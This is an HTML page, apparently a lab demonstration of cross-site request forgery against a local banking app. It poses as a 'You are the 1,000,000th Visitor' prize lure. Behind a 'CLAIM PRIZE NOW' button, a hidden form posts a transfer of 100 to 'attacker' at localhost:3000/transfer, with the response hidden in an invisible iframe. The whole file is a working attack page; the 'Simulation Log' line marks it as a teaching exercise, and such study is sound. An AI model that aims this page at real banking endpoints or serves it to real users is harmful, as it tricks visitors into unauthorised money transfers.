<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>You Won!</title>
    <style>
        body {
            background-color: #ff0000;
            color: yellow;
            text-align: center;
            font-family: 'Comic Sans MS', cursive, sans-serif;
            padding-top: 50px;
        }

        button {
            font-size: 2rem;
            padding: 1rem 2rem;
            background: yellow;
            color: red;
            border: 5px dashed white;
            cursor: pointer;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.1);
            }

            100% {
                transform: scale(1);
            }
        }
    </style>
</head>

<body>
    <h1>🎉 CONGRATULATIONS! 🎉</h1>
    <h2>You are the 1,000,000th Visitor!</h2>
    <p>Click the button below to claim your prize!</p>

    <!-- The Attack Form -->
    <form action="http://localhost:3000/transfer" method="POST" target="hiddenFrame" id="attackForm">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="100">
        <button type="submit">CLAIM PRIZE NOW !!!</button>
    </form>

    <iframe name="hiddenFrame" style="display:none;"></iframe>

    <div style="margin-top: 2rem; color: white;">
        <p>Simulation Log:</p>
        <div id="log">Waiting for user action...</div>
    </div>

    <script>
        const form = document.getElementById('attackForm');
        form.addEventListener('submit', () => {
            document.getElementById('log').innerText = 'Attack request sent! Check your Bank Dashboard to see if money was stolen.';
        });
    </script>
</body>

</html>
